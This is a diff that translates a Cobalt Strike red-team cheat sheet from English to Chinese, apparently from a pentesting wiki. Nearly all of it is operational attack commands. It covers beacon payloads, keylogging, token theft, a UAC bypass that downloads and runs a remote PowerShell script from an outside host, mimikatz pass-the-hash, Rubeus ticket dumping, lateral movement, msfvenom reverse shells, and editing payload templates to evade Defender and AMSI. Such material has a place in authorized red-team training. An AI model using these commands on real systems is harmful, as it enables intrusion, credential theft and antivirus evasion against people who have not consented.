@@ -4,16 +4,16 @@
 
 ### C2 Listeners
 
-`Cobalt Strike -> Listeners -> Add/Edit` then you can select where to listen, which kind of beacon to use (http, dns, smb...) and more.
+`Cobalt Strike -> Listeners -> Add/Edit` 然后您可以选择监听的位置，使用哪种信标（http, dns, smb...）等。
 
 ### Peer2Peer Listeners
 
-The beacons of these listeners don't need to talk to the C2 directly, they can communicate to it through other beacons.
+这些监听器的信标不需要直接与C2通信，它们可以通过其他信标与其通信。
 
-`Cobalt Strike -> Listeners -> Add/Edit` then you need to select the TCP or SMB beacons
+`Cobalt Strike -> Listeners -> Add/Edit` 然后您需要选择TCP或SMB信标
 
-* The **TCP beacon will set a listener in the port selected**. To connect to a TCP beacon use the command `connect <ip> <port>` from another beacon
-* The **smb beacon will listen in a pipename with the selected name**. To connect to a SMB beacon you need to use the command `link [target] [pipe]`.
+* **TCP信标将在所选端口设置监听器**。要连接到TCP信标，请使用命令 `connect <ip> <port>` 从另一个信标
+* **smb信标将在选定名称的管道中监听**。要连接到SMB信标，您需要使用命令 `link [target] [pipe]`。
 
 ### Generate & Host payloads
 
@@ -21,18 +21,18 @@ The beacons of these listeners don't need to talk to the C2 directly, they can c
 
 `Attacks -> Packages ->`&#x20;
 
-* **`HTMLApplication`** for HTA files
-* **`MS Office Macro`** for an office document with a macro
-* **`Windows Executable`** for a .exe, .dll orr service .exe
-* **`Windows Executable (S)`** for a **stageless** .exe, .dll or service .exe (better stageless than staged, less IoCs)
+* **`HTMLApplication`** 用于HTA文件
+* **`MS Office Macro`** 用于带有宏的办公文档
+* **`Windows Executable`** 用于.exe, .dll或服务.exe
+* **`Windows Executable (S)`** 用于**无阶段**的.exe, .dll或服务.exe（无阶段比有阶段更好，IoCs更少）
 
 #### Generate & Host payloads
 
-`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` This will generate a script/executable to download the beacon from cobalt strike in formats such as: bitsadmin, exe, powershell and python
+`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` 这将生成一个脚本/可执行文件，以从cobalt strike下载信标，格式包括：bitsadmin, exe, powershell和python
 
 #### Host Payloads
 
-If you already has the file you want to host in a web sever just go to `Attacks -> Web Drive-by -> Host File` and select the file to host and web server config.
+如果您已经有要在Web服务器上托管的文件，只需转到 `Attacks -> Web Drive-by -> Host File` 并选择要托管的文件和Web服务器配置。
 
 ### Beacon Options
 
@@ -40,17 +40,17 @@ If you already has the file you want to host in a web sever just go to `Attacks 
 execute-assembly &#x3C;/path/to/executable.exe>
 
 # Screenshots
-printscreen    # Take a single screenshot via PrintScr method
-screenshot     # Take a single screenshot
-screenwatch    # Take periodic screenshots of desktop
-## Go to View -> Screenshots to see them
+printscreen    # 通过PrintScr方法拍摄单个屏幕截图
+screenshot     # 拍摄单个屏幕截图
+screenwatch    # 定期拍摄桌面截图
+## 转到View -> Screenshots查看它们
 
 # keylogger
 keylogger [pid] [x86|x64]
-## View > Keystrokes to see the keys pressed
+## View > Keystrokes查看按下的键
 
 # portscan
-portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
+portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # 在另一个进程中注入端口扫描操作
 portscan [targets] [ports] [arp|icmp|none] [max connections]
 
 # Powershell
@@ -60,10 +60,10 @@ powershell &#x3C;just write powershell cmd here>
 
 # User impersonation
 ## Token generation with creds
-make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
-ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
-rev2self # Stop using token generated with make_token
-## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.
+make_token [DOMAIN\user] [password] #创建用于在网络中模拟用户的令牌
+ls \\computer_name\c$ # 尝试使用生成的令牌访问计算机中的C$
+rev2self # 停止使用make_token生成的令牌
+## 使用make_token会生成事件4624：账户成功登录。 该事件在Windows域中非常常见，但可以通过过滤登录类型来缩小范围。 如上所述，它使用LOGON32_LOGON_NEW_CREDENTIALS，类型为9。
 
 # UAC Bypass
 elevate svc-exe &#x3C;listener>
@@ -71,106 +71,106 @@ elevate uac-token-duplication &#x3C;listener>
 runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
 
 ## Steal token from pid
-## Like make_token but stealing the token from a process
-steal_token [pid] # Also, this is useful for network actions, not local actions
-## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated &#x3C;current_username> - it's impersonating our own cloned token.
-ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
-rev2self # Stop using token from steal_token
+## 类似于make_token，但从进程中窃取令牌
+steal_token [pid] # 此外，这对于网络操作而非本地操作很有用
+## 从API文档中我们知道，这种登录类型“允许调用者克隆其当前令牌”。 这就是信标输出显示模拟&#x3C;current_username>的原因 - 它正在模拟我们自己的克隆令牌。
+ls \\computer_name\c$ # 尝试使用生成的令牌访问计算机中的C$
+rev2self # 停止使用steal_token的令牌
 
-## Launch process with nwe credentials
-spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
-## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).
+## 使用新凭据启动进程
+spawnas [domain\username] [password] [listener] #从具有读取权限的目录执行，例如：cd C:\
+## 类似于make_token，这将生成Windows事件4624：账户成功登录，但登录类型为2（LOGON32_LOGON_INTERACTIVE）。 它将详细说明调用用户（TargetUserName）和模拟用户（TargetOutboundUserName）。
 
 ## Inject into process
 inject [pid] [x64|x86] [listener]
-## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).
+## 从OpSec的角度来看：除非真的有必要，否则不要执行跨平台注入（例如x86 -> x64或x64 -> x86）。
 
 ## Pass the hash
-## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
+## 此修改过程需要对LSASS内存进行修补，这是一个高风险操作，需要本地管理员权限，并且如果启用了受保护进程轻量级（PPL），则不太可行。
 pth [pid] [arch] [DOMAIN\user] [NTLM hash]
 pth [DOMAIN\user] [NTLM hash]
 
 ## Pass the hash through mimikatz
 mimikatz sekurlsa::pth /user:&#x3C;username> /domain:&#x3C;DOMAIN> /ntlm:&#x3C;NTLM HASH> /run:"powershell -w hidden"
-## Withuot /run, mimikatz spawn a cmd.exe, if you are running as a user with Desktop, he will see the shell (if you are running as SYSTEM you are good to go)
-steal_token &#x3C;pid> #Steal token from process created by mimikatz
+## 如果没有/run，mimikatz会生成cmd.exe，如果您以具有桌面的用户身份运行，他将看到shell（如果您以SYSTEM身份运行，则可以继续）
+steal_token &#x3C;pid> #从mimikatz创建的进程中窃取令牌
 
 ## Pass the ticket
-## Request a ticket
+## 请求票证
 execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;username> /domain:&#x3C;domain> /aes256:&#x3C;aes_keys> /nowrap /opsec
-## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
+## 创建一个新的登录会话以使用新票证（以免覆盖被攻陷的票证）
 make_token &#x3C;domain>\&#x3C;username> DummyPass
-## Write the ticket in the attacker machine from a poweshell session &#x26; load it
+## 从powershell会话中将票证写入攻击者机器并加载
 [System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
 kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi
 
 ## Pass the ticket from SYSTEM
-## Generate a new process with the ticket
+## 使用票证生成新进程
 execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;USERNAME> /domain:&#x3C;DOMAIN> /aes256:&#x3C;AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
-## Steal the token from that process
+## 从该进程中窃取令牌
 steal_token &#x3C;pid>
 
 ## Extract ticket + Pass the ticket
 ### List tickets
 execute-assembly C:\path\Rubeus.exe triage
-### Dump insteresting ticket by luid
+### Dump interesting ticket by luid
 execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:&#x3C;luid> /nowrap
-### Create new logon session, note luid and processid
+### 创建新的登录会话，注意luid和processid
 execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
-### Insert ticket in generate logon session
+### 在生成的登录会话中插入票证
 execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
-### Finally, steal the token from that new process
+### 最后，从新进程中窃取令牌
 steal_token &#x3C;pid>
 
 # Lateral Movement
-## If a token was created it will be used
+## 如果创建了令牌，将会使用它
 jump [method] [target] [listener]
-## Methods:
-## psexec                    x86   Use a service to run a Service EXE artifact
-## psexec64                  x64   Use a service to run a Service EXE artifact
-## psexec_psh                x86   Use a service to run a PowerShell one-liner
-## winrm                     x86   Run a PowerShell script via WinRM
-## winrm64                   x64   Run a PowerShell script via WinRM
+## 方法：
+## psexec                    x86   使用服务运行服务EXE工件
+## psexec64                  x64   使用服务运行服务EXE工件
+## psexec_psh                x86   使用服务运行PowerShell一行代码
+## winrm                     x86   通过WinRM运行PowerShell脚本
+## winrm64                   x64   通过WinRM运行PowerShell脚本
 
 remote-exec [method] [target] [command]
-## Methods:
-<strong>## psexec                          Remote execute via Service Control Manager
-</strong>## winrm                           Remote execute via WinRM (PowerShell)
-## wmi                             Remote execute via WMI
+## 方法：
+<strong>## psexec                          通过服务控制管理器远程执行
+</strong>## winrm                           通过WinRM（PowerShell）远程执行
+## wmi                             通过WMI远程执行
 
-## To execute a beacon with wmi (it isn't ins the jump command) just upload the beacon and execute it
+## 要使用wmi执行信标（它不在jump命令中），只需上传信标并执行
 beacon> upload C:\Payloads\beacon-smb.exe
 beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe
 
 
 # Pass session to Metasploit - Through listener
-## On metaploit host
+## 在metaploit主机上
 msf6 > use exploit/multi/handler
 msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
 msf6 exploit(multi/handler) > set LHOST eth0
 msf6 exploit(multi/handler) > set LPORT 8080
 msf6 exploit(multi/handler) > exploit -j
 
-## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
+## 在cobalt上：Listeners > Add并将Payload设置为Foreign HTTP。 将Host设置为10.10.5.120，将Port设置为8080，然后单击保存。
 beacon> spawn metasploit
-## You can only spawn x86 Meterpreter sessions with the foreign listener.
+## 您只能使用外部监听器生成x86 Meterpreter会话。
 
 # Pass session to Metasploit - Through shellcode injection
-## On metasploit host
+## 在metasploit主机上
 msfvenom -p windows/x64/meterpreter_reverse_http LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f raw -o /tmp/msf.bin
-## Run msfvenom and prepare the multi/handler listener
+## 运行msfvenom并准备multi/handler监听器
 
-## Copy bin file to cobalt strike host
+## 将bin文件复制到cobalt strike主机
 ps
-shinject &#x3C;pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process
+shinject &#x3C;pid> x64 C:\Payloads\msf.bin #在x64进程中注入metasploit shellcode
 
 # Pass metasploit session to cobalt strike
-## Fenerate stageless Beacon shellcode, go to Attacks > Packages > Windows Executable (S), select the desired listener, select Raw as the Output type and select Use x64 payload.
-## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode
+## 生成无阶段信标shellcode，转到Attacks > Packages > Windows Executable (S)，选择所需的监听器，选择Raw作为输出类型，并选择使用x64有效负载。
+## 在metasploit中使用post/windows/manage/shellcode_inject注入生成的cobalt strike shellcode
 
 
 # Pivoting
-## Open a socks proxy in the teamserver
+## 在teamserver中打开socks代理
 beacon> socks 1080
 
 # SSH connection
@@ -180,38 +180,27 @@ beacon> ssh 10.10.17.12:22 username password</code></pre>
 
 ### Artifact Kit
 
-Usually in `/opt/cobaltstrike/artifact-kit` you can find the code and pre-compiled templates (in `/src-common`) of the payloads that cobalt strike is going to use to generate the binary beacons.
+通常在`/opt/cobaltstrike/artifact-kit`中，您可以找到cobalt strike将用于生成二进制信标的代码和预编译模板（在`/src-common`中）。
 
-Using [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) with the generated backdoor (or just with the compiled template) you can find what is making defender trigger. It's usually a string. Therefore you can just modify the code that is generating the backdoor so that string doesn't appear in the final binary.
+使用[ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)与生成的后门（或仅使用编译的模板），您可以找到触发防御者的原因。 通常是一个字符串。 因此，您只需修改生成后门的代码，以便该字符串不会出现在最终的二进制文件中。
 
-After modifying the code just run `./build.sh` from the same directory and copy the `dist-pipe/` folder into the Windows client in `C:\Tools\cobaltstrike\ArtifactKit`.
-
+修改代码后，只需从同一目录运行`./build.sh`并将`dist-pipe/`文件夹复制到Windows客户端的`C:\Tools\cobaltstrike\ArtifactKit`中。
 ```
 pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
 ```
+不要忘记加载激进脚本 `dist-pipe\artifact.cna` 以指示 Cobalt Strike 使用我们想要的磁盘资源，而不是加载的资源。
 
-Don't forget to load the aggressive script `dist-pipe\artifact.cna` to indicate Cobalt Strike to use the resources from disk that we want and not the ones loaded.
+### 资源包
 
-### Resource Kit
+ResourceKit 文件夹包含 Cobalt Strike 基于脚本的有效载荷模板，包括 PowerShell、VBA 和 HTA。
 
-The ResourceKit folder contains the templates for Cobalt Strike's script-based payloads including PowerShell, VBA and HTA.
-
-Using [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) with the templates you can find what is defender (AMSI in this case) not liking and modify it:
-
+使用 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) 和模板，您可以找到防御者（在这种情况下是 AMSI）不喜欢的内容并进行修改：
 ```
 .\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
 ```
+修改检测到的行可以生成一个不会被捕获的模板。
 
-Modifying the detected lines one can generate a template that won't be caught.
-
-Don't forget to load the aggressive script `ResourceKit\resources.cna` to indicate Cobalt Strike to luse the resources from disk that we want and not the ones loaded.
-
-
-
-
-
-
-
+不要忘记加载激进脚本 `ResourceKit\resources.cna`，以指示 Cobalt Strike 使用我们想要的磁盘资源，而不是加载的资源。
 ```bash
 cd C:\Tools\neo4j\bin
 neo4j.bat console
@@ -233,5 +222,4 @@ pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
 
 
 ```
-
 
